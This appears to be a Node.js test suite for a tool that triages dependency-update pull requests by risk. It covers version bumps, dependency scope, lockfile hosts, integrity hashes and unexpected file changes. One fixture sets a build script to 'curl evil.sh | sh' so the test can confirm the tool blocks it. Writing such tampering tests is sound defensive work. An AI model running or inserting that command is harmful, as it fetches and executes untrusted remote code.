import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { analyze, bumpType, parseVersion } from './triage-dependency-pr.mjs';

const REGISTRY = 'https://registry.npmjs.org';

function lockEntry(name, version, extra = {}) {
  return {
    version,
    resolved: `${REGISTRY}/${name}/-/${name}-${version}.tgz`,
    ...extra,
  };
}

// Builds a minimal before/after pair for analyze().
function scenario({
  base = {},
  head = {},
  baseDeps = { dependencies: {}, devDependencies: {} },
  headDeps = baseDeps,
  extraPackageJson = {},
  headExtraPackageJson = extraPackageJson,
  changedFiles = ['package.json', 'package-lock.json'],
}) {
  const toLock = (versions) => ({
    lockfileVersion: 3,
    packages: {
      '': {},
      ...Object.fromEntries(
        Object.entries(versions).map(([name, value]) => {
          const { version, ...extra } =
            typeof value === 'string' ? { version: value } : value;
          return [`node_modules/${name}`, lockEntry(name, version, extra)];
        }),
      ),
    },
  });
  return analyze({
    basePkg: { name: 'x', ...baseDeps, ...extraPackageJson },
    headPkg: { name: 'x', ...headDeps, ...headExtraPackageJson },
    baseLock: toLock(base),
    headLock: toLock(head),
    changedFiles,
  });
}

describe('parseVersion', () => {
  it('reads plain versions and ranges', () => {
    assert.deepEqual(parseVersion('1.2.3'), {
      major: 1,
      minor: 2,
      patch: 3,
      pre: null,
    });
    assert.equal(parseVersion('^4.5.6').major, 4);
    assert.equal(parseVersion('1.0.0-beta.2').pre, 'beta.2');
    assert.equal(parseVersion('latest'), null);
  });
});

describe('bumpType', () => {
  it('classifies bumps', () => {
    assert.equal(bumpType('1.2.3', '2.0.0'), 'major');
    assert.equal(bumpType('1.2.3', '1.3.0'), 'minor');
    assert.equal(bumpType('1.2.3', '1.2.4'), 'patch');
    assert.equal(bumpType('1.2.3', '1.2.3-rc.1'), 'prerelease');
    assert.equal(bumpType('1.2.3', '1.2.2'), 'downgrade');
    assert.equal(bumpType(null, '1.0.0'), 'added');
    assert.equal(bumpType('1.0.0', null), 'removed');
    assert.equal(bumpType('weird', '1.0.0'), 'unknown');
  });

  it('treats breaking 0.x bumps as major', () => {
    assert.equal(bumpType('0.18.0', '0.19.0'), 'major');
    assert.equal(bumpType('0.18.0', '0.18.1'), 'patch');
    assert.equal(bumpType('0.0.3', '0.0.4'), 'major');
    assert.equal(bumpType('0.19.0', '0.18.0'), 'downgrade');
  });
});

describe('analyze', () => {
  const deps = {
    dependencies: { dayjs: '^1.11.0', 'react-router': '^8.0.0' },
    devDependencies: { prettier: '3.7.4', eslint: '^9.0.0', webpack: '^5.0.0' },
  };

  it('treats a patch bump of a dev tool as low risk without a browser check', () => {
    const result = scenario({
      baseDeps: deps,
      base: { prettier: { version: '3.7.4', dev: true } },
      head: { prettier: { version: '3.7.5', dev: true } },
    });
    assert.equal(result.risk, 'low');
    assert.equal(result.needsBrowserCheck, false);
    assert.equal(result.changes[0].scope, 'tooling');
  });

  it('treats a minor bump of a runtime dependency as medium risk', () => {
    const result = scenario({
      baseDeps: deps,
      base: { dayjs: '1.11.0' },
      head: { dayjs: '1.12.0' },
    });
    assert.equal(result.risk, 'medium');
    assert.equal(result.needsBrowserCheck, true);
  });

  it('treats a major bump of a runtime dependency as high risk and flags critical packages', () => {
    const result = scenario({
      baseDeps: deps,
      base: { 'react-router': '8.0.0' },
      head: { 'react-router': '9.0.0' },
    });
    assert.equal(result.risk, 'high');
    assert.equal(result.changes[0].critical, true);
    // A risky bump is still an ordinary update, not a sign of tampering.
    assert.equal(result.blocked, false);
  });

  it('treats a major bump of a dev tool as medium risk', () => {
    const result = scenario({
      baseDeps: deps,
      base: { eslint: { version: '9.0.0', dev: true } },
      head: { eslint: { version: '10.0.0', dev: true } },
    });
    assert.equal(result.risk, 'medium');
    assert.equal(result.needsBrowserCheck, false);
  });

  it('needs a browser check for bundler tooling even though it is a devDependency', () => {
    const result = scenario({
      baseDeps: deps,
      base: { webpack: { version: '5.0.0', dev: true } },
      head: { webpack: { version: '5.0.1', dev: true } },
    });
    assert.equal(result.changes[0].scope, 'bundle-tooling');
    assert.equal(result.needsBrowserCheck, true);
    assert.equal(result.risk, 'low');
  });

  it('treats direct optional and peer dependencies as runtime', () => {
    for (const section of ['optionalDependencies', 'peerDependencies']) {
      const sectionDeps = { [section]: { fsevents: '^2.0.0' } };
      const result = scenario({
        baseDeps: sectionDeps,
        base: { fsevents: '2.0.0' },
        head: { fsevents: '3.0.0' },
      });
      assert.equal(result.changes[0].scope, 'runtime', section);
      assert.equal(result.risk, 'high', section);
      assert.equal(result.needsBrowserCheck, true, section);
    }
  });

  it('keeps the runtime section for a package listed in several', () => {
    const result = scenario({
      baseDeps: {
        dependencies: { dayjs: '^1.0.0' },
        devDependencies: { dayjs: '^1.0.0' },
      },
      base: { dayjs: '1.0.0' },
      head: { dayjs: '1.1.0' },
    });
    assert.equal(result.changes[0].scope, 'runtime');
  });

  it('handles lockfile-only transitive updates', () => {
    const result = scenario({
      baseDeps: deps,
      base: { 'left-pad': '1.0.0' },
      head: { 'left-pad': '1.0.1' },
    });
    assert.equal(result.changes[0].direct, false);
    assert.equal(result.changes[0].scope, 'runtime');
    assert.equal(result.risk, 'low');
    assert.equal(result.needsBrowserCheck, true);
  });

  it('marks dev-only transitive updates as tooling', () => {
    const result = scenario({
      baseDeps: deps,
      base: { 'dev-helper': { version: '1.0.0', dev: true } },
      head: { 'dev-helper': { version: '1.1.0', dev: true } },
    });
    assert.equal(result.changes[0].scope, 'tooling');
    assert.equal(result.needsBrowserCheck, false);
  });

  it('is high risk when package.json changes outside the dependency sections', () => {
    const result = scenario({
      baseDeps: deps,
      extraPackageJson: { scripts: { build: 'webpack' } },
      headExtraPackageJson: { scripts: { build: 'curl evil.sh | sh' } },
      base: { dayjs: '1.11.0' },
      head: { dayjs: '1.11.1' },
    });
    assert.equal(result.risk, 'high');
    assert.equal(result.blocked, true);
    assert.match(result.reasons.join('\n'), /outside the dependency sections/);
  });

  it('is high risk when the lockfile resolves from another host', () => {
    const result = analyze({
      basePkg: { dependencies: { dayjs: '^1.0.0' } },
      headPkg: { dependencies: { dayjs: '^1.0.0' } },
      baseLock: {
        packages: { 'node_modules/dayjs': lockEntry('dayjs', '1.0.0') },
      },
      headLock: {
        lockfileVersion: 3,
        packages: {
          'node_modules/dayjs': {
            version: '1.0.1',
            resolved: 'https://example.com/dayjs-1.0.1.tgz',
          },
        },
      },
      changedFiles: ['package.json', 'package-lock.json'],
    });
    assert.equal(result.risk, 'high');
    assert.equal(result.blocked, true);
    assert.match(result.reasons.join('\n'), /outside registry\.npmjs\.org/);
  });

  it('is high risk when an unchanged version moves to another host', () => {
    const result = analyze({
      basePkg: { dependencies: { dayjs: '^1.0.0' } },
      headPkg: { dependencies: { dayjs: '^1.0.0' } },
      baseLock: {
        packages: { 'node_modules/dayjs': lockEntry('dayjs', '1.0.0') },
      },
      headLock: {
        lockfileVersion: 3,
        packages: {
          'node_modules/dayjs': {
            version: '1.0.0',
            resolved: 'https://example.com/dayjs-1.0.0.tgz',
          },
        },
      },
      changedFiles: ['package-lock.json'],
    });
    assert.equal(result.risk, 'high');
    assert.equal(result.blocked, true);
    assert.match(result.reasons.join('\n'), /outside registry\.npmjs\.org/);
  });

  it('is high risk when an unchanged version gets a new integrity hash', () => {
    const result = scenario({
      baseDeps: deps,
      base: { dayjs: { version: '1.11.0', integrity: 'sha512-old' } },
      head: { dayjs: { version: '1.11.0', integrity: 'sha512-new' } },
      changedFiles: ['package-lock.json'],
    });
    assert.equal(result.risk, 'high');
    assert.equal(result.blocked, true);
    assert.match(
      result.reasons.join('\n'),
      /without changing their version: dayjs/,
    );
  });

  it('is high risk when other files are changed', () => {
    const result = scenario({
      baseDeps: deps,
      base: { dayjs: '1.11.0' },
      head: { dayjs: '1.11.1' },
      changedFiles: ['package.json', 'package-lock.json', 'src/index.tsx'],
    });
    assert.equal(result.risk, 'high');
    assert.equal(result.blocked, true);
    assert.deepEqual(result.unexpectedFiles, ['src/index.tsx']);
  });

  it('raises grouped updates to at least medium', () => {
    const base = {};
    const head = {};
    for (let i = 0; i < 20; i++) {
      base[`dev-${i}`] = { version: '1.0.0', dev: true };
      head[`dev-${i}`] = { version: '1.0.1', dev: true };
    }
    const result = scenario({ baseDeps: deps, base, head });
    assert.equal(result.risk, 'medium');
    assert.equal(result.changeCount, 20);
  });

  it('blocks lockfiles without a packages map, whose sources it cannot check', () => {
    const v1Entry = {
      version: '1.0.1',
      resolved: 'https://example.com/dayjs-1.0.1.tgz',
    };
    for (const headLock of [
      { lockfileVersion: 1, dependencies: { dayjs: v1Entry } },
      // A version 1 lockfile with a decoy packages map.
      {
        lockfileVersion: 1,
        packages: {},
        dependencies: { dayjs: v1Entry },
      },
    ]) {
      const result = analyze({
        basePkg: { dependencies: { dayjs: '^1.0.0' } },
        headPkg: { dependencies: { dayjs: '^1.0.0' } },
        baseLock: {
          lockfileVersion: 3,
          packages: { 'node_modules/dayjs': lockEntry('dayjs', '1.0.0') },
        },
        headLock,
        changedFiles: ['package-lock.json'],
      });
      assert.equal(result.blocked, true);
      assert.match(result.blockers.join('\n'), /lockfileVersion 2 or 3/);
    }
  });

  it('reports when nothing changed', () => {
    const result = scenario({
      baseDeps: deps,
      base: { dayjs: '1.11.0' },
      head: { dayjs: '1.11.0' },
    });
    assert.equal(result.risk, 'low');
    assert.equal(result.changeCount, 0);
  });
});
